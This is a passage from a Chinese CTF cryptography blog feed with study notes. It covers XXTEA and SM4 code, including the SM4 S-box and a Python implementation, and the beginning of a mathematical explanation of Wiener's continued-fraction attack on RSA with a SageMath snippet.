class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++) &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>]; </span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--) &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><p>盒子记录下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sbox = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">        <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">        <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">        <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">        <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">        <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">        <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">        <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">        <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">        <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">        <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">        <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">        <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">        <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">        <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">        <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">        <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>抄下la佬的python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM4Cipher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(key) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;SM4 key must be length of 16. &quot;</span>)</span><br><span class="line">        self._key_r = self._generate_key(key)</span><br><span class="line">        self.block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(plaintext, self._key_r)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(ciphertext, self._key_r[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_do</span>(<span class="params">self, text: <span class="built_in">bytes</span>, key_r: <span class="built_in">list</span></span>):</span></span><br><span class="line">        text_ = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># 将 128bit 转化成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            text_[i] = <span class="built_in">int</span>.from_bytes(text[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = text_[<span class="number">1</span>] ^ text_[<span class="number">2</span>] ^ text_[<span class="number">3</span>] ^ key_r[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            temp = text_[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">2</span>) ^ self._rot_left(box_out, <span class="number">10</span>)</span><br><span class="line">            temp = temp ^ self._rot_left(box_out, <span class="number">18</span>) ^ self._rot_left(box_out, <span class="number">24</span>)</span><br><span class="line">            text_ = text_[<span class="number">1</span>:] + [temp]</span><br><span class="line">        text_ = text_[::-<span class="number">1</span>]  <span class="comment"># 结果逆序</span></span><br><span class="line">        <span class="comment"># 将 4x32bit 合并成 128bit</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.extend(text_[i].to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;密钥生成&quot;&quot;&quot;</span></span><br><span class="line">        key_r, key_temp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)], [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">        CK = [<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">              <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">              <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">              <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>]</span><br><span class="line">        <span class="comment"># 将 128bit 拆分成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            temp = <span class="built_in">int</span>.from_bytes(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            key_temp[i] = temp ^ FK[i]</span><br><span class="line">        <span class="comment"># 循环生成轮密钥</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = key_temp[<span class="number">1</span>] ^ key_temp[<span class="number">2</span>] ^ key_temp[<span class="number">3</span>] ^ CK[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            key_r[i] = key_temp[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">13</span>) ^ self._rot_left(box_out, <span class="number">23</span>)</span><br><span class="line">            key_temp = key_temp[<span class="number">1</span>:] + [key_r[i]]</span><br><span class="line">        <span class="keyword">return</span> key_r</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_s_box</span>(<span class="params">n: <span class="built_in">int</span></span>):</span></span><br><span class="line">        BOX = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>,</span><br><span class="line">               <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>,</span><br><span class="line">               <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>,</span><br><span class="line">               <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>,</span><br><span class="line">               <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>,</span><br><span class="line">               <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>,</span><br><span class="line">               <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">               <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>,</span><br><span class="line">               <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">               <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>,</span><br><span class="line">               <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>,</span><br><span class="line">               <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>,</span><br><span class="line">               <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>,</span><br><span class="line">               <span class="number">0x48</span>]</span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># 将 32bit 拆分成 4x8bit，依次进行S盒变换</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(n.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)):</span><br><span class="line">            result.append(BOX[item])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(result, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_rot_left</span>(<span class="params">n, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;循环左移&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> ((n &lt;&lt; m) | (n &gt;&gt; (<span class="number">32</span> - m))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0123456789ABCDEFFEDCBA9876543210&quot;</span>)  <span class="comment"># 128bit密钥</span></span><br><span class="line">plaintext = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00112233445566778899aabbccddeeff&quot;</span>)  <span class="comment"># 128bit明文</span></span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line"><span class="built_in">print</span>(sm4.encrypt(plaintext).<span class="built_in">hex</span>())  <span class="comment"># 09325c4853832dcb9337a5984f671b9a</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Salsa20"><a href="#Salsa20" class="headerlink" title="Salsa20"></a>Salsa20</h2><h2 id="Chacha20"><a href="#Chacha20" class="headerlink" title="Chacha20"></a>Chacha20</h2><p>之前CTFSHOW jjcup春哥出过，之后复现</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto-TopologyTree</category>
      </categories>
      <tags>
        <tag>RC4</tag>
      </tags>
  </entry>
  <entry>
    <title>Wiener&#39;s Attack</title>
    <url>/posts/1b1ce809/</url>
    <content><![CDATA[<p>参考</p>
<p><a href="https://blog.csdn.net/jcbx_/article/details/109306542">https://blog.csdn.net/jcbx_/article/details/109306542</a></p>
<p><a href="https://eprint.iacr.org/2015/399.pdf">New attack on RSA with Moduli $N=p^rq$</a></p>
<p><a href="https://www.sci-hub.ren/https://link.springer.com/chapter/10.1007/3-540-46701-7_14">Extending Wiener’s Attack in the Presence of Many Decrypting Exponents</a></p>
<p><a href="https://www.youtube.com/watch?v=4ulHOV8iLls&list=PL149BD5341FDF6641">Winter School on Cryptography 2012</a>（i春秋的挂了，fr.油管</p>
<span id="more"></span>

<h1 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h1><p>Wiener’s attack 是根据连分数的性质以及定理，通过对$\frac{e}{N}$的连续分数逼近找到对应的$\frac{k}{dg}$，从而分解N</p>
<h2 id="基础的维纳攻击"><a href="#基础的维纳攻击" class="headerlink" title="基础的维纳攻击"></a>基础的维纳攻击</h2><h3 id="Continued-Fractions"><a href="#Continued-Fractions" class="headerlink" title="Continued Fractions"></a>Continued Fractions</h3><p>连分数就是一个数的连续分式展开，比如</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211119113723077.png" alt="image-20211119113723077"></p>
<p>通常用数组方式来描述，记<br>$$<br>\frac{p}{q}=[a_0,a_1,a_2,…,a_n]<br>$$<br>计算连分数的每一项用欧几里得算法：<br>$$<br>\begin{align*}<br>  p&amp;=a_0q+r_0\\<br>  q&amp;=a_1r_0+r_1\\<br>  r_0&amp;=a_2r_1+r_2\\<br>  &amp;\ \ \vdots\\<br>  r_{n-2}&amp;=a_nr_{n-1}+0<br>\end{align*}<br>$$</p>
<h3 id="Convergent"><a href="#Convergent" class="headerlink" title="Convergent"></a>Convergent</h3><p>定义$c_i$为连分数每一次展开的收敛，即<br>$$<br>\forall i\in[0,n],\qquad c_i=[a_0,a_1,…,a_i]<br>$$<br>也就是</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211119113736193.png" alt="image-20211119113736193"></p>
<h3 id="Legendre’s-theorem"><a href="#Legendre’s-theorem" class="headerlink" title="Legendre’s theorem"></a>Legendre’s theorem</h3><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211118114450890.png" alt="image-20211118114450890"></p>
<p>也就是说，当满足$|\xi-\frac{a}{b}|&lt;\frac{1}{2b^2}$，对$\xi$的连分数展开可以得到$\frac{a}{b}$</p>
<h3 id="Wiener’s-Attack-in-RSA"><a href="#Wiener’s-Attack-in-RSA" class="headerlink" title="Wiener’s Attack in RSA"></a>Wiener’s Attack in RSA</h3><p>假设$ed=1+k\lambda(N)$，$\lambda(N)=lcm(p-1,q-1)$，$g=(p-1,q-1)$</p>
<p>当$d&lt;N^{0.25}$时，可算得（没懂<br>$$<br>|\frac{e}{N}-\frac{k}{dg}|=|\frac{1}{dN}-\frac{ks}{dgN}|&lt;\frac{ks}{dgN}&lt;\frac{1}{2(dg)^2}<br>$$<br>因此$\frac{k}{dg}$就是$\frac{e}{N}$连分数的一个逼近</p>
<p>我们可以通过$\frac{k}{dg}$求出$p,q$，将$ed=1+k\lambda(N)$两边同乘一个$g$，得到<br>$$<br>edg=k(p-1)(q-1)+g,\qquad k&gt;g<br>$$<br>两边同除一个$k$<br>$$<br>\lfloor \frac{edg}{k}\rfloor=(p-1)(q-1)<br>$$<br>因为$\frac{n-(p-1)(q-1)+1}{2}=\frac{p+q}{2}=\frac{n-\lfloor \frac{edg}{k}\rfloor+1}{2}$</p>
<p>又$(\frac{p+q}{2})^2-n=(\frac{p-q}{2})^2$</p>
<p>可以计算<br>$$<br>(\frac{n-\lfloor \frac{edg}{k}\rfloor+1}{2})^2-n<br>$$<br>检测其能否完全开方，可以的话说明这个逼近就是$\lfloor \frac{edg}{k}\rfloor$，和$n$联立方程解出$p,q$</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>SageMath（自带连分数实现，之前的代码老长，但其实没有必要</p>
<p>直接获取连分数的每一项收敛，$\frac{k}{dg}$就在其中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_frac = continued_fraction(e / N)</span><br><span class="line">li_con = _frac.convergents()</span><br></pre></td></tr></table></figure>

